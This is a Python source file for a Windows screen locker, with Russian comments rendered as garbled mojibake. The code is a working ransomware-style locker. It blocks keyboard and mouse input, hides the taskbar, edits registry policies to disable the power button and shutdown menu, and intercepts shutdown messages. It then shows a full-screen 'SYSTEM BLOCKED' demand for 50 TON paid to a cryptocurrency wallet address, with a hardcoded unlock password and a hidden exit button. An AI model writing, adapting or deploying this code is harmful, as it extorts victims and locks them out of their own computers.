# -*- coding: utf-8 -*-
import sys
import subprocess
import importlib
import os
import ctypes
from ctypes import wintypes

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
required_libraries = ['tkinter', 'time']

def install_library(library):
    try:
        importlib.import_module(library)
        print(f"‚úì {library} —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
    except ImportError:
        print(f"‚è≥ –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é {library}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
            print(f"‚úì {library} —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
        except Exception as e:
            print(f"‚úó –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ {library}: {e}")

print("üîß –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏...")
for lib in required_libraries:
    install_library(lib)
print("‚úÖ –í—Å–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")

# –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏
import tkinter as tk
from tkinter import messagebox, font
import time

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã Windows
GWL_WNDPROC = -4
WM_QUERYENDSESSION = 0x0011
WM_ENDSESSION = 0x0016

# –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class SystemBlocker:
    def __init__(self):
        self.original_wndproc = None
        self.setup_shutdown_block()
        
    def setup_shutdown_block(self):
        """–ë–ª–æ–∫–∏—Ä—É–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É —Å–∏—Å—Ç–µ–º—ã"""
        try:
            # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–ºÊúÄÈ´ò –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏—è
            kernel32.SetProcessShutdownParameters(0x4FF, 0)
            
            # –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º–æ–µ –æ–∫–Ω–æ –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
            self.hwnd = user32.GetConsoleWindow()
            if self.hwnd:
                self.original_wndproc = user32.SetWindowLongPtrA(
                    self.hwnd, 
                    GWL_WNDPROC, 
                    ctypes.cast(self.window_proc, ctypes.c_void_p)
                )
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {e}")
    
    def window_proc(self, hwnd, msg, wparam, lparam):
        """–ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏"""
        if msg == WM_QUERYENDSESSION:
            # –ë–ª–æ–∫–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã
            return 0
        elif msg == WM_ENDSESSION:
            # –ë–ª–æ–∫–∏—Ä—É–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–µ–∞–Ω—Å–∞
            return 0
        
        # –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –≤—ã–∑—ã–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫
        return user32.CallWindowProcA(self.original_wndproc, hwnd, msg, wparam, lparam)
    
    def disable_power_buttons(self):
        """–û—Ç–∫–ª—é—á–∞–µ—Ç –∫–Ω–æ–ø–∫–∏ –ø–∏—Ç–∞–Ω–∏—è"""
        try:
            # –û—Ç–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –ø–∏—Ç–∞–Ω–∏—è —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä
            subprocess.run([
                'reg', 'add', 
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoClose', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
            
            # –û—Ç–∫–ª—é—á–∞–µ–º –º–µ–Ω—é –≤—ã–∫–ª—é—á–µ–Ω–∏—è
            subprocess.run([
                'reg', 'add', 
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoStartMenuPowerButton', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
        except:
            pass
    
    def enable_power_buttons(self):
        """–í–∫–ª—é—á–∞–µ—Ç –∫–Ω–æ–ø–∫–∏ –ø–∏—Ç–∞–Ω–∏—è"""
        try:
            subprocess.run([
                'reg', 'delete', 
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoClose', '/f'
            ], capture_output=True)
            
            subprocess.run([
                'reg', 'delete', 
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoStartMenuPowerButton', '/f'
            ], capture_output=True)
        except:
            pass

class UltimateSystemLocker:
    def __init__(self):
        # –ë–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º—É –î–û —Å–æ–∑–¥–∞–Ω–∏—è –æ–∫–Ω–∞
        self.system_blocker = SystemBlocker()
        self.system_blocker.disable_power_buttons()
        
        self.setup_window()
        self.create_widgets()
        self.setup_protection()
        
    def setup_window(self):
        """–°–æ–∑–¥–∞–µ–º –∏ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –≥–ª–∞–≤–Ω–æ–µ –æ–∫–Ω–æ"""
        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg='#000000')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.focus_force()
        
        # –ó–∞–ø—Ä–µ—â–∞–µ–º –∑–∞–∫—Ä—ã—Ç–∏–µ –ª—é–±—ã–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Alt-F4>', lambda e: "break")
        
        # –°–∫—Ä—ã–≤–∞–µ–º –∫—É—Ä—Å–æ—Ä
        self.root.config(cursor='none')
        
    def setup_protection(self):
        """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∑–∞—â–∏—Ç—É"""
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –≤—Å–µ –∫–ª–∞–≤–∏—à–∏
        self.block_all_keys()
        
        # –°–∫—Ä—ã–≤–∞–µ–º –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á
        self.hide_taskbar()
        
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –≤–≤–æ–¥
        self.block_system_input()
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–æ–∫—É—Å
        self.root.after(100, self.force_focus)
        self.root.grab_set_global()
        
    def block_all_keys(self):
        """–ë–ª–æ–∫–∏—Ä—É–µ–º –≤—Å–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏"""
        keys = [
            '<Alt_L>', '<Alt_R>', '<Win_L>', '<Win_R>', '<Control_L>', '<Control_R>',
            '<Escape>', '<F1>', '<F2>', '<F3>', '<F4>', '<F5>', '<F6>', '<F7>', '<F8>',
            '<F9>', '<F10>', '<F11>', '<F12>', '<Alt-Tab>', '<Control-Alt-Delete>',
            '<Control-Escape>', '<Menu>', '<Print>', '<Pause>', '<Scroll_Lock>', '<Insert>'
        ]
        for key in keys:
            self.root.bind(key, lambda e: "break")
    
    def hide_taskbar(self):
        """–°–∫—Ä—ã–≤–∞–µ–º –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á"""
        try:
            taskbar = user32.FindWindowW("Shell_TrayWnd", None)
            if taskbar:
                user32.ShowWindow(taskbar, 0)
        except:
            pass
    
    def show_taskbar(self):
        """–ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á"""
        try:
            taskbar = user32.FindWindowW("Shell_TrayWnd", None)
            if taskbar:
                user32.ShowWindow(taskbar, 1)
        except:
            pass
    
    def block_system_input(self):
        """–ë–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤–≤–æ–¥"""
        try:
            user32.BlockInput(True)
        except:
            pass
    
    def unblock_system_input(self):
        """–†–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤–≤–æ–¥"""
        try:
            user32.BlockInput(False)
        except:
            pass
    
    def force_focus(self):
        """–ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–æ–∫—É—Å"""
        self.password_entry.focus_set()
        self.root.focus_force()
    
    def do_nothing(self):
        """–§—É–Ω–∫—Ü–∏—è-–∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –∑–∞–∫—Ä—ã—Ç–∏—è"""
        pass

    def create_widgets(self):
        """–°–æ–∑–¥–∞–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å"""
        main_frame = tk.Frame(self.root, bg='#000000')
        main_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ
        warning_font = font.Font(family="Arial", size=16, weight="bold")
        warning = tk.Label(main_frame, 
                          text="üö´ SYSTEM BLOCKED üö´\n"
                               "UQCq1hQ-LrutafKMhlGUZ5pa4wtCW6jpHkE3w2oDKswqIQ6M waiting for 50 TON ‚ùó",
                          fg="#FF0000", bg='#000000', font=warning_font)
        warning.pack(pady=(0, 30))
        
        # –ó–∞–º–æ–∫
        lock_font = font.Font(family="Arial", size=72)
        self.lock_label = tk.Label(main_frame, text="üîí", 
                                  fg="#FF0000", bg='#000000', font=lock_font)
        self.lock_label.pack(pady=(0, 30))
        
        # –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è
        instruction_font = font.Font(family="Arial", size=14)
        instruction = tk.Label(main_frame, 
                              text="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Å–∏—Å—Ç–µ–º—ã:",
                              fg="#FFFFFF", bg='#000000', font=instruction_font)
        instruction.pack(pady=(0, 20))
        
        # –ü–æ–ª–µ –¥–ª—è –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è
        self.password_entry = tk.Entry(main_frame, show="‚Ä¢", font=("Arial", 20), 
                                      width=20, bd=0, bg='#222222', fg='white', 
                                      insertbackground='white', justify='center',
                                      highlightthickness=3, highlightcolor='#FF0000')
        self.password_entry.pack(pady=(0, 25), ipady=10, ipadx=10)
        self.password_entry.bind('<Return>', lambda e: self.check_password())
        
        # –ö–Ω–æ–ø–∫–∞ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
        button_font = font.Font(family="Arial", size=14, weight="bold")
        unlock_btn = tk.Button(main_frame, text="–†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–¢–¨", 
                              command=self.check_password,
                              font=button_font, bg='#FF0000', fg='white',
                              bd=0, padx=30, pady=10)
        unlock_btn.pack(pady=(0, 20))
        
        # –°–µ–∫—Ä–µ—Ç–Ω—ã–π –≤—ã—Ö–æ–¥ (–ª–µ–≤—ã–π –≤–µ—Ä—Ö–Ω–∏–π —É–≥–æ–ª)
        self.secret_exit_btn = tk.Button(self.root, text="", 
                                        command=self.secret_exit,
                                        bg='#000000', fg='#000000',
                                        bd=0, width=3, height=1)
        self.secret_exit_btn.place(x=10, y=10)
        
        # –í—Ä–µ–º—è
        time_font = font.Font(family="Arial", size=36, weight="bold")
        self.time_label = tk.Label(self.root, text="", 
                                  fg="#FFFFFF", bg='#000000', font=time_font)
        self.time_label.place(relx=0.5, rely=0.15, anchor="center")
        
        # –î–∞—Ç–∞
        date_font = font.Font(family="Arial", size=16)
        self.date_label = tk.Label(self.root, text="", 
                                  fg="#CCCCCC", bg='#000000', font=date_font)
        self.date_label.place(relx=0.5, rely=0.22, anchor="center")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
        self.update_time_date()

    def update_time_date(self):
        """–û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –∏ –¥–∞—Ç—É"""
        current_time = time.strftime("%H:%M:%S")
        current_date = time.strftime("%d.%m.%Y")
        self.time_label.config(text=current_time)
        self.date_label.config(text=current_date)
        self.root.after(1000, self.update_time_date)

    def check_password(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–∞—Ä–æ–ª—å"""
        if self.password_entry.get() == "1007":
            self.unlock_system()
        else:
            self.password_entry.delete(0, tk.END)
            self.password_entry.focus_set()

    def secret_exit(self):
        """–°–µ–∫—Ä–µ—Ç–Ω—ã–π –≤—ã—Ö–æ–¥"""
        self.secret_exit_btn.config(text="–£–¥–µ—Ä–∂–∏–≤–∞–π—Ç–µ", fg='white', bg='#FF0000')
        self.root.after(5000, self.confirm_secret_exit)

    def confirm_secret_exit(self):
        """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –≤—ã—Ö–æ–¥–∞"""
        if self.secret_exit_btn.cget("text") == "–£–¥–µ—Ä–∂–∏–≤–∞–π—Ç–µ":
            self.unlock_system()

    def unlock_system(self):
        """–†–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º—É"""
        self.unblock_system_input()
        self.show_taskbar()
        self.system_blocker.enable_power_buttons()
        self.root.attributes('-topmost', False)
        self.root.grab_release()
        self.root.config(cursor='')
        self.root.destroy()

    def run(self):
        """–ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ"""
        try:
            self.root.mainloop()
        finally:
            # –ù–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π —Ä–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º—É
            self.unblock_system_input()
            self.show_taskbar()

if __name__ == "__main__":
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É
    app = UltimateSystemLocker()
    app.run()